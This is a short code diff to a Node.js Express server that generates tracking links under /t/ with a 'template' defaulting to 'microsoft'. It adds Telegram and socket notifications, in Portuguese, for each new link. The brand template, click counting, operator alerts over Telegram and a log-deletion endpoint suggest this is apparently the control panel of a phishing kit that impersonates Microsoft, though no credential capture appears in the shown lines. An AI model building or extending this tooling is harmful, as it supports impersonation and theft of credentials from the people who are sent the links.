@@ -126,8 +126,16 @@ app.post('/api/links', async (req, res) => {
         const id = Math.random().toString(36).substring(2, 10);
         const newLink = { id, url: `/t/${id}`, template: template || 'microsoft', createdAt: new Date(), clicks: 0 };
         await saveLink(newLink);
+        
+        // Immediate notification
+        io.emit('new_link_created', newLink);
+        sendTelegramMsg(`🔗 *NOVO LINK GERADO*\n🆔 ID: \`${id}\`\n📋 Template: \`${newLink.template}\`\n📍 URL: \`${newLink.url}\``);
+        
         res.json(newLink);
-    } catch (e) { res.status(500).json({ error: e.message }); }
+    } catch (e) {
+        console.error('[SERVER] Erro ao gerar link:', e.message);
+        res.status(500).json({ error: e.message });
+    }
 });
 
 app.delete('/api/logs', async (req, res) => {
